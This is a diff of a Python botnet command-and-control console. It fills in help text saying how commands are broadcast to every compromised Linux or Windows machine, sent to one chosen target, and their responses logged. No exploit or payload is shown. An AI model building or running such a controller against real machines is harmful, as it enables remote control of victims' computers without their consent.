@@ -138,11 +138,11 @@ class BotnetCmdCtrl:
 		"""
 		cmd = input(GREEN + "cmd $: " + RESET)
 		while cmd != 'quit':
-			if cmd == 'list linux':
+			if cmd == 'list linux': 
 				for index, ipaddr in enumerate(LINUX_CONNS.keys()):
 					print(index, ipaddr)
 
-			elif cmd == 'list windows':
+			elif cmd == 'list windows': 
 				for index, ipaddr in enumerate(WINDOWS_CONNS.keys()):
 					print(index, ipaddr)
 
@@ -259,14 +259,14 @@ class BotnetCmdCtrl:
 		"""
 		print("""
 Commands:
-list linux ->
-list windows ->
-count linux ->
-count windows ->
-linux ->
-windows ->
-select ->
-switch ->
+list linux -> Lists all the Linux connections (IPs) 
+list windows -> Lists all the Windows connections (IPs)
+count linux -> Lists the amount of Linux connections (int)
+count windows -> Lists the amount of Windows connections (int)
+linux ->  Any command following this string will be sent to all of the Linux machines under control 
+windows -> Any command following this string will be sent to all of the Windows machines under control
+select -> Any command following this string + the target IP will be sent to a specific machine under control
+switch -> Entering this string will write the responses that targets send back to a file as well as display it in the terminal
 		""")
 
 """ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ """
